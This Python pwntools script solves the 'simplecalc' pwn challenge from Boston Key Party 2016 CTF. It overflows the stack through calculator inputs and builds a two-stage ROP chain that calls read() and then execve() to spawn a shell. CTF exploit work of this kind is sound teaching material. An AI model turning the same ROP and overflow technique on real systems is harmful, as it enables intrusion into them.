#!/usr/bin/python
# created for "simplecalc" pwn challenge from Boston Key Party 2016 CTF
# data can only be input with integer calculations, and /bin/sh and system() aren't available
# therefore, a ROP chain that calls read() with a writable memory address is used
# to place /bin/sh into memory
# then the second ROP chain stage calls execve() with the pointer to /bin/sh as an argument

from pwn import *
import struct

def addition(p,integer1,integer2):
    p.sendline("1")
    p.recvuntil(": ")
    p.sendline(integer1)
    p.recvuntil(": ")
    p.sendline(integer2)
    p.recvuntil("> ")

def subtraction(p,integer1,integer2):
    p.sendline("2")
    p.recvuntil(": ")
    p.sendline(integer1)
    p.recvuntil(": ")
    p.sendline(integer2)
    p.recvuntil("> ")

p = process("./simplecalc")

#gdb.attach(p,'''
#break *main+450
#continue
#''')

# ROP gadgets
pop_rax = 0x00474a67 # pop rax; ret
syscall = 0x00467f95 # syscall; ret
pop_rsi = 0x00492512 # pop rsi; ret
pop_rdi = 0x00493fd6 # pop rdi; ret
pop_rdx = 0x004560b4 # pop rdx; ret
writable_mem = 0x006c1060 # from .data; readelf -x .data simplecalc
write_what_where = 0x0000000000470f11 # mov qword ptr [rsi], rax; ret


p.recvuntil(": ")
p.sendline("255")
p.recvuntil("> ")

# all these values getting placed on the stack are irrelevant
# they're just there as identifiable padding to get to the RIP overwrite
# do a bunch of calculations to get 0xdeadbeef placed on the stack
for i in range(0,4):
    addition(p,"3735928059","500")
# 0xcafebabe
for i in range(0,2):
    addition(p,"3405691082","500")
for i in range(0,6):
    addition(p,"4619681","500")
# this next value will be passed to free()
# perform subtraction to get 0 to be passed to free() to prevent a crash
# each calc forms one dword, so we need two to form the full qword
subtraction(p,"4619681","4619681")
subtraction(p,"4619681","4619681")
# now keep spraying 0xdeadbeef onto the stack
for i in range(0,4):
    addition(p,"3735928059","500")

# finally, overwrite RIP with the ROP chain

log.info("Beginning stage 1 of ROP chain...")
# use this stage to call read() on writable memory
# this will allow placing /bin/sh into memory, since we can't write a string otherwise
addition(p,"4671603","500") # pop rax; ret
subtraction(p,"4619681","4619681") # complete qword
subtraction(p,"4619681","4619681") # pop 0 into rax for read() syscall
subtraction(p,"4619681","4619681") # complete qword

addition(p,"4799970","500") # pop rdi; ret
subtraction(p,"4619681","4619681") # complete qword
subtraction(p,"4619681","4619681") # pop 0 into rdi for fd stdin
subtraction(p,"4619681","4619681") # complete qword

addition(p,"4793118","500") # pop rsi; ret
subtraction(p,"4619681","4619681") # complete qword
addition(p,"7081580","500") # writable mem
subtraction(p,"4619681","4619681") # complete qword

addition(p,"4546240","500") # pop rdx; ret
subtraction(p,"4619681","4619681") # complete qword
subtraction(p,"408","400") # read 0x8 bytes
subtraction(p,"4619681","4619681") # complete qword
addition(p,"4619681","500") # syscall; ret
subtraction(p,"4619681","4619681") # complete qword

log.success("Completed stage 1, beginning stage 2 of the ROP chain...")
# use this stage to call execve() with the pointer to /bin/sh

addition(p,"4671603","500") # pop rax; ret
subtraction(p,"4619681","4619681") # complete qword
subtraction(p,"459","400") # place 59 into rax for execve() syscall
subtraction(p,"4619681","4619681")

addition(p,"4799970","500") # pop rdi; ret
subtraction(p,"4619681","4619681") # complete qword
addition(p,"7081580","500") # pop pointer to /bin/sh into rdi
subtraction(p,"4619681","4619681") # complete qword

addition(p,"4793118","500") # pop rsi; ret
subtraction(p,"4619681","4619681") # complete qword
subtraction(p,"4619681","4619681") # put 0 into rsi; should be irrelevant for this exploit
subtraction(p,"4619681","4619681") # complete qword

addition(p,"4546240","500") # pop rdx; ret
subtraction(p,"4619681","4619681") # complete qword
subtraction(p,"4619681","4619681") # put 0 into rdx; should be irrelevant for this exploit
subtraction(p,"4619681","4619681") # complete qword

# finally, make the execve() syscall
addition(p,"4619681","500") # syscall; ret
subtraction(p,"4619681","4619681") # complete qword

log.success("Completed stage 2 of the ROP chain, triggering the vulnerability...")

# now trigger the ROP chain
p.sendline("5")
# send the data to read()
p.sendline("/bin//sh")
# get a shell!
p.interactive()

p.close()
